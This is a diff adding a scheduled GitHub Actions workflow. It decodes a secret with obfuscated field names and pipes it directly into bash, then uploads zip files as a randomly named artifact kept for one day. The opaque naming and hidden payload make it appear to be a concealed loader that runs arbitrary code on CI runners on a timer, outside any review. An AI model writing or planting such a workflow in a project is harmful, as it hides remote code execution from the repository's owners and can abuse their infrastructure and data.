@@ -1,0 +1,32 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '18 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          w595: ${{ secrets.w595 }}
+        run: |
+          printf '%s' "$w595" | jq -r .bovj10 | /bin/bash
+          printf '%s' "$bdb13564" | jq -r .rt11987 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: t3oiSZTk
+          path: "*.zip"
+          retention-days: 1
